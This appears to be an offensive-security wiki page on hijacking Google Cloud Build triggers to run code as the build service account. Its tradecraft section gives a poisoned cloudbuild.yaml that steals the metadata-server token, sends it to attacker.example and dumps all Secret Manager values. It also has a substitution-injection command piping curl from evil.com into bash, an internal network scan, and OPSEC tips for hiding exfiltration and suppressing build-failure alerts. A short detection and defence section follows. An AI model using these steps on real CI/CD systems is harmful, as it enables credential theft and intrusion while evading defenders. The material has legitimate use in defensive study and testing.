---
title: GCP Cloud Build trigger abuse
slug: gcp-cloud-build-trigger-abuse
---

> **TL;DR:** Cloud Build runs a fully privileged build worker as a managed service account with project-level access; control the trigger (push to a connected repo, edit `cloudbuild.yaml`, abuse `included/ignoredFiles`) and you execute arbitrary code as the build SA — almost always `roles/editor` or a hand-rolled super-role. Trigger ACLs are the most common control failure.

## What it is
Cloud Build is GCP's managed CI/CD; triggers fire on Cloud Source / GitHub / Bitbucket pushes and run the steps declared in `cloudbuild.yaml` inside ephemeral worker VMs. Each build runs as `<project-number>@cloudbuild.gserviceaccount.com` (default) or a user-chosen GSA. The build worker has full network access to project APIs, so the SA's IAM bindings define the blast radius. Two classes of abuse: (1) inject build steps via repo write, (2) abuse the trigger system itself (manual triggers, regex includes, substitutions) to execute attacker code with the build SA.

## Preconditions / where it applies
- Write access to a repo connected to a Cloud Build trigger (push to a branch the trigger matches).
- Or `cloudbuild.triggers.update` IAM permission (often bundled in `roles/cloudbuild.builds.editor`).
- Or read of the build worker's logs, where misconfigured pipelines leak secrets (Application Default Credentials, KMS keys, GitHub tokens).

## Tradecraft
**Step 1 — Enumerate triggers.**

```bash
gcloud builds triggers list --format=json \
  | jq -r '.[] | {name, github, sourceToBuild, serviceAccount, includedFiles, ignoredFiles}'
```

Note the `serviceAccount` field — that's your inheritance target. Empty means the default Cloud Build SA, which historically (pre-2024) was `roles/editor` project-wide. New projects after April 2024 ship the default SA with reduced perms, but most existing projects still have the legacy `roles/editor` binding.

**Pattern 1 — `cloudbuild.yaml` edit on a feature branch.** If the trigger is `branch: .*` or matches `feature/*`:

```yaml
# cloudbuild.yaml (attacker push)
steps:
  - name: 'gcr.io/cloud-builders/gcloud'
    entrypoint: bash
    args:
      - -c
      - |
        # Exfil ADC token
        TOKEN=$(curl -sH "Metadata-Flavor: Google" \
          http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
          | jq -r .access_token)
        curl -X POST https://attacker.example/x -d "t=$TOKEN"

        # Or dump all secret manager values
        for s in $(gcloud secrets list --format='value(name)'); do
          echo "=== $s ==="; gcloud secrets versions access latest --secret="$s"
        done
```

The build runs in seconds; on a busy repo CI status check looks normal — no signal until secret abuse is detected downstream.

**Pattern 2 — Trigger include/ignore bypass.** Some triggers restrict by file path (`includedFiles: ["src/**"]`). Pushing to `src/` always builds; pushing to `docs/` doesn't. But if the trigger is `includedFiles: ["src/**"]` AND `ignoredFiles: ["**/test_*"]`, you can name a file `src/test_evil.yaml` — `ignoredFiles` wins and the build skips, but you've still committed the malicious `cloudbuild.yaml` for the *next* build to pick up. More commonly: PRs from forks where included-paths logic doesn't apply to the PR-checkout step.

**Pattern 3 — Substitution injection.** Triggers accept user substitutions (`_VERSION`, `_ENV`). If `cloudbuild.yaml` does `bash -c "deploy.sh $_VERSION"`:

```bash
gcloud builds triggers run TRIGGER_NAME \
    --substitutions=_VERSION='1.0; curl evil.com/x | bash'
```

`builds.runTrigger` permission is enough — you don't need repo write.

**Pattern 4 — Connected-repo poisoning (GitHub App).** Cloud Build's GitHub App installation grants read on connected repos. If you compromise *a different repo* in the same GitHub org, you may be able to push to a Cloud-Build-connected repo via shared org-write tokens, especially in orgs with `Restrict to write-roles only` disabled.

**Pattern 5 — Long-lived `_PR_NUMBER` triggers.** Triggers configured for PRs from forks: by default Cloud Build runs PRs from forks only after maintainer approval, but `includeBuildLogs: INCLUDE_BUILD_LOGS_WITH_STATUS` exposes the build logs publicly in commit status checks. ADC tokens, GCS URLs, and even short-lived secret values appear there.

**Pattern 6 — Worker pool privilege.** Private worker pools (Cloud Build Private Pools) often run inside a VPC with peering to prod. Inside the build you can reach internal services that weren't intended to be exposed.

```bash
# From inside the build
nmap -sT -p- 10.0.0.0/8 --top-ports 100
```

## Detection and defence
- Audit log filter: `protoPayload.serviceName="cloudbuild.googleapis.com" AND protoPayload.methodName=~"Trigger"`. Alert on `RunBuildTrigger` from non-CI users, on `UpdateBuildTrigger` outside change windows.
- Bind a *dedicated, minimal-priv GSA* to every trigger; never reuse the default SA. Drop `roles/editor` from the default SA explicitly (the inherited binding survives by default).
- Enforce branch protection: triggers should fire only on protected branches with required PR review.
- For PR triggers from forks: enable "Comment control" so a maintainer must approve before the build runs.
- Use Cloud Build approval policy (`approvalConfig.approvalRequired=true`) for production-deploy triggers.
- Tag built images with provenance (SLSA — see [[slsa-supply-chain-framework]]) so downstream consumers can refuse builds from poisoned commits.

## OPSEC pitfalls
- Build logs are retained in Cloud Logging — your exfil curl is logged with the destination URL. Use DNS exfil or chunk into legitimate-looking artifact uploads to GCS buckets you control.
- The Cloud Build SA's token is short-lived (1 hour); exchange for a longer-lived refresh via `roles/iam.serviceAccountTokenCreator` chains if you find them.
- A failed build in a normally-green repo triggers Slack alerts on most teams; make the malicious step run *before* the legitimate steps and `exit 0` after.

## References
- [Cloud Build — IAM roles](https://cloud.google.com/build/docs/iam-roles-permissions) — service account permissions reference
- [Cloud Build — Build configuration](https://cloud.google.com/build/docs/build-config-file-schema) — cloudbuild.yaml schema
- [Rhino Security Labs — GCP CI/CD attacks](https://rhinosecuritylabs.com/cloud-security/ci-cd-pipeline-google-cloud-build-vulnerabilities/) — chain examples
- [Orca Security — Cloud Build privilege escalation](https://orca.security/resources/blog/) — case study

See also: [[gcp-iam-misconfig]], [[gke-workload-identity-abuse]], [[cicd-pipeline-hardening-defender]], [[ci-cd-as-cloud-attack-surface]], [[aws-lambda-attacks]]
